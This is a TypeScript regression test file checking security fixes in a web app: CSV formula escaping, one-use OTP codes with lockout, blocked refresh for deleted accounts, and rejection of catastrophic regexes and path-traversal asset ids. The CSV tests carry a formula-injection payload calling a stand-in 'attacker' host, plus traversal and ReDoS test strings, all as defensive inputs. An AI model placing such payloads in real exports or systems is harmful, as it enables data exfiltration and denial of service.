/**
 * Regression tests for the vulnerabilities fixed during the security review.
 *
 * Uses the same conventions as the other suites: a dedicated database set
 * before any app module is imported, with dynamic imports inside `before()`.
 */
process.env.MONGO_URI =
    process.env.TEST_MONGO_URI ??
    'mongodb://localhost:27017/paperwork_security_fixes_test';

import assert from 'node:assert/strict';
import { after, before, beforeEach, describe, it } from 'node:test';

import { stringify } from 'csv-stringify';

let mongoose: typeof import('mongoose').default;
let connectDB: (retries?: number) => Promise<void>;
let disconnectDB: () => Promise<void>;
let otpChallengeService: typeof import('@/modules/auth/service/otpChallenge.service').default;
let OtpChallengeModel: typeof import('@/modules/auth/schemas/otpChallenge.model').default;
let UserModel: typeof import('@/modules/auth/schemas/user.schema').default;
let AuthServiceBoot: typeof import('@/modules/auth/service/auth.service').default;
let assetUtils: typeof import('@/modules/signatures/cloudinary/utils/cloudinary.asset');
let validation: typeof import('@/modules/forms/validators/validator.common');

const newUserId = () => String(new mongoose.Types.ObjectId());

async function csv(options: Record<string, unknown>, row: Record<string, string>) {
    return new Promise<string>((resolve, reject) => {
        let out = '';
        const stream = stringify(options);
        stream.on('data', (chunk) => {
            out += chunk;
        });
        stream.on('end', () => resolve(out));
        stream.on('error', reject);
        stream.write(row);
        stream.end();
    });
}

before(async () => {
    mongoose = (await import('mongoose')).default;
    ({ connectDB, disconnectDB } = await import('@/db/connection'));
    otpChallengeService = (
        await import('@/modules/auth/service/otpChallenge.service')
    ).default;
    OtpChallengeModel = (
        await import('@/modules/auth/schemas/otpChallenge.model')
    ).default;
    UserModel = (await import('@/modules/auth/schemas/user.schema')).default;
    AuthServiceBoot = (await import('@/modules/auth/service/auth.service'))
        .default;
    assetUtils =
        await import('@/modules/signatures/cloudinary/utils/cloudinary.asset');
    validation = await import('@/modules/forms/validators/validator.common');

    await connectDB();
    await mongoose.connection.dropDatabase();
});

beforeEach(async () => {
    await OtpChallengeModel.deleteMany({});
    await UserModel.deleteMany({});
});

after(async () => {
    if (!mongoose) return;
    await mongoose.connection.dropDatabase();
    await disconnectDB();
});

describe('CSV export escapes spreadsheet formulas', () => {
    it('neutralises a leading = with escape_formulas enabled', async () => {
        const out = await csv(
            { header: true, columns: ['note'], escape_formulas: true },
            { note: '=WEBSERVICE("http://attacker")' }
        );

        assert.match(out, /"'=WEBSERVICE/);
        assert.ok(!out.includes('=WEBSERVICE("http://attacker")'));
    });

    it('leaves the payload intact with the old options (control case)', async () => {
        const out = await csv(
            { header: true, columns: ['note'], bom: true },
            { note: '=WEBSERVICE("http://attacker")' }
        );

        assert.ok(out.includes('=WEBSERVICE'), 'control case must reproduce the bug');
    });
});

describe('server-side OTP challenges', () => {
    it('verifies once and rejects replay', async () => {
        const userId = newUserId();
        const email = 'otp@example.com';

        const { otp } = await otpChallengeService.issue(
            userId,
            email,
            '2fa'
        );

        assert.equal(
            await otpChallengeService.verify(userId, email, otp, '2fa'),
            true
        );
        assert.equal(
            await otpChallengeService.verify(userId, email, otp, '2fa'),
            false,
            'a consumed code must never verify a second time'
        );
    });

    it('allows only one winner for concurrent submissions of the same code', async () => {
        const userId = newUserId();
        const email = 'otp@example.com';

        const { otp } = await otpChallengeService.issue(
            userId,
            email,
            '2fa'
        );

        const results = await Promise.all([
            otpChallengeService.verify(userId, email, otp, '2fa'),
            otpChallengeService.verify(userId, email, otp, '2fa'),
        ]);

        assert.equal(results.filter(Boolean).length, 1);
    });

    it('locks the account after five failed attempts, independent of IP', async () => {
        const userId = newUserId();
        const email = 'otp@example.com';

        const { otp } = await otpChallengeService.issue(
            userId,
            email,
            'email-verify'
        );

        for (let i = 0; i < 5; i++) {
            assert.equal(
                await otpChallengeService.verify(
                    userId,
                    email,
                    '000000',
                    'email-verify'
                ),
                false
            );
        }

        assert.equal(
            await otpChallengeService.verify(
                userId,
                email,
                otp,
                'email-verify'
            ),
            false,
            'the correct code must be blocked after the attempt ceiling'
        );
    });

    it('isolates challenges by purpose', async () => {
        const userId = newUserId();
        const email = 'otp@example.com';

        const { otp } = await otpChallengeService.issue(
            userId,
            email,
            '2fa'
        );

        assert.equal(
            await otpChallengeService.verify(
                userId,
                email,
                otp,
                'email-verify'
            ),
            false
        );
    });
});

describe('account state enforcement', () => {
    for (const [field, value] of [
        ['accountDeletedStatus', 'deleted'],
        ['accountDeactivationStatus', 'deactivated'],
    ] as const) {
        it(`rejects token refresh for ${value} accounts`, async () => {
            const user = await UserModel.create({
                email: `${value}-${Date.now()}@example.com`,
                passwordHash: 'unused',
                [field]: value,
            });

            await assert.rejects(
                AuthServiceBoot.refreshTokenService({
                    userId: String(user._id),
                    email: user.email,
                    tokenIssuedAt: Math.floor(Date.now() / 1000),
                }),
                (error: { statusCode?: number }) => error.statusCode === 403
            );
        });
    }
});

describe('input hardening', () => {
    it('rejects nested-quantifier regex patterns', () => {
        const parse = (pattern: string) =>
            validation.validationRuleSchema.safeParse({
                ruleType: 'REGEX_MATCH',
                pattern,
            });

        assert.equal(parse('^(a+)+$').success, false);
        assert.equal(parse('^(\\d*)*$').success, false);
        assert.equal(parse('^[a-z]+$').success, true);
    });

    it('rejects traversal-style Cloudinary public ids', () => {
        assert.equal(assetUtils.isOwnedPublicId('paperwork/../other/victim', 'paperwork'), false);
        assert.equal(assetUtils.isOwnedPublicId('paperwork/./victim', 'paperwork'), false);
        assert.equal(assetUtils.isOwnedPublicId('paperwork/avatar-1', 'paperwork'), true);
    });
});
